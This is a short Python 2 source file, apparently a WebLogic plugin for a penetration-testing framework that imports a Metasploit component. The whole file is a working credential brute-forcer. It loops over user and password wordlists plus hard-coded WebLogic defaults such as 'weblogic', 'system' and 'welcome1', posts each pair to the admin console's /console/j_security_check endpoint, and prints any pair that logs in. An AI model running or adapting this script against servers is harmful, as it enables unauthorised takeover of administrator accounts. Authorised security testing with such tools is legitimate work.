'''
plugin WebLogic
triggers=servlet
ports=7001
'''

import os
import sys
import httplib, urllib
import components.metasploit as metasploit


def tryingCreds(ip_addr,port):
	
	
	print "[*] Trying default weblogic creds on "+ ip_addr

	f_users = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/users", 'r')
	f_passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')

	#Bruteforce firewall is enable by default on WebLogic admin console

	# For test WebLogic:WebLogic1
	users = f_users.read()
	passwds = f_passwds.read()

	for user in (users +'\nWebLogic\nweblogic\nsystem').split('\n'):
		#user = user[:-1]
		for pwd in (passwds+'\nWebLogic1\nwelcome1\nweblogic').split('\n'):
			#pwd =pwd[:-1]


			params = urllib.urlencode({'j_username' :user, 'j_password' :pwd, "j_character_encoding": "UTF-8"})
			headers = {"Content-Type": "application/x-www-form-urlencoded"}
			conn = httplib.HTTPConnection(ip_addr, port, timeout=10)

			conn.request("POST","/console/j_security_check", params, headers)
			res = conn.getresponse()
			
			if res.status == 302 and '/console/login/LoginForm' not in res.read():
				print "[+] Creds found ! "+user+":"+pwd
			elif res.status == 404:
				print "[-] No admin console"
				return

	print "[*] Trying done."
	

def main(ip_addr, port):
	try:
		tryingCreds(ip_addr,port)
	except Exception as e:
		print e

if __name__ == '__main__':
	main(sys.argv[1], sys.argv[2])
